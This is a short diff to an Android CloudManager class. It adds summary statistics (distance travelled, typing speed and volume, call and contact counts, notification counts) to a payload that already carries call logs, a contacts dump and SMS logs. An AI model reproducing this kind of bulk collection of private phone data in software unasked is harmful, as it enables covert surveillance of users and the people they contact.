@@ -51,6 +51,31 @@ object CloudManager {
                 // Attach Phone Data (Directly from Manager)
                 json.put("call_logs", PhoneManager.getCallLogs(ctx))
                 json.put("contacts_dump", PhoneManager.getContacts(ctx))
+
+                // --- NEW: SUMMARY STATS AGGREGATION ---
+                val summary = JSONObject()
+                
+                // 1. Location Stats
+                val distKm = prefs.getFloat("total_distance_km", 0f)
+                summary.put("location_dist_km", distKm)
+                
+                // 2. Typing Stats
+                val typeStats = TypingManager.getStats(ctx)
+                summary.put("typing_chars", typeStats.getInt("total_chars"))
+                summary.put("typing_wpm", typeStats.getInt("avg_wpm"))
+                
+                // 3. Phone Stats
+                val phoneStats = PhoneManager.getStats(ctx)
+                summary.put("call_duration_sec", phoneStats.totalDuration)
+                summary.put("call_count_total", phoneStats.totalCalls)
+                summary.put("call_count_in", phoneStats.incoming)
+                summary.put("call_count_out", phoneStats.outgoing)
+                summary.put("contact_count", phoneStats.contactCount)
+                
+                // 4. Notification Stats
+                summary.put("notif_count_total", prefs.getInt("notif_count", 0))
+                
+                json.put("summary_stats", summary)
                 json.put("android_version", android.os.Build.VERSION.RELEASE)
                 
                 // Attach SMS logs
